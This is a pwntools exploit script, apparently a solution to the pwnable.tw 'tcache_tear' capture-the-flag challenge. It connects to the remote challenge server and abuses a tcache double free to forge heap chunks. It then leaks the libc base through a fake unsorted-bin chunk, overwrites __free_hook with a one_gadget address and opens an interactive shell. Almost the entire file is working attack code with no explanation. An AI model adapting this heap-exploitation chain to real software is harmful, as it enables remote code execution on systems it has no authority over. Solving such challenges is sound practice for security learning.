from pwn import *

r = remote("chall.pwnable.tw", 10207)
#r = process("./tcache_tear")
l = ELF("libc.so")

def malloc(size, data):
    r.sendlineafter("Your choice :", "1")
    r.sendlineafter("Size:", str(size))
    r.sendlineafter("Data:", data)

def free():
    r.sendlineafter("Your choice :", "2")

def info():
    r.sendlineafter("Your choice :", "3")

def exit():
    r.sendlineafter("Your choice :", "4")


r.sendlineafter("Name:", "hank0438")
info()
r.recvuntil("Name :")
name = r.recvuntil("$$$")[:-3]
print(name)

### construct fake chunk
malloc(0x70, "aaa")
free()
free()
malloc(0x70, p64(0x602550))
malloc(0x70, "bbb")
malloc(0x70, p64(0) + p64(0x21) + p64(0)*3 + p64(0x21))
input("@")

### construct fake chunk at name
malloc(0x60, "aaa")
free()
free()
malloc(0x60, p64(0x602060 - 0x10))
malloc(0x60, "ccc")
malloc(0x60, p64(0) + p64(0x501) + p64(0)*5 + p64(0x602060))
input("@")

### use info() leak libc_base
free()
info()
r.recvuntil("Name :")
libc_base = u64(r.recvuntil("$$$")[:8]) - 0x3ebca0
print(hex(libc_base))
input("@")

### prepare some useful libc function
free_hook = l.symbols[b'__free_hook']
#print("__free_hook: ", hex(free_hook))
bash_offset = next(l.search('/bin/sh'))
#print("bash_offset: ", hex(bash_offset))
system_offset = l.symbols[b'system']
#print("system_offset: ", hex(system_offset))

### write free_hook
malloc(0x50, "aaa")
free()
free()
malloc(0x50, p64(libc_base + free_hook))
malloc(0x50, "ddd")
#malloc(0x50, p64(libc_base + system_offset))
malloc(0x50, p64(libc_base + 0x4f322))
input("@")

malloc(0x20, "aaa")
free()

### system("/bin/sh")
#r.sendafter("> ", "1")
#r.sendafter("Size: ", str(libc_base + bash_offset))



r.interactive()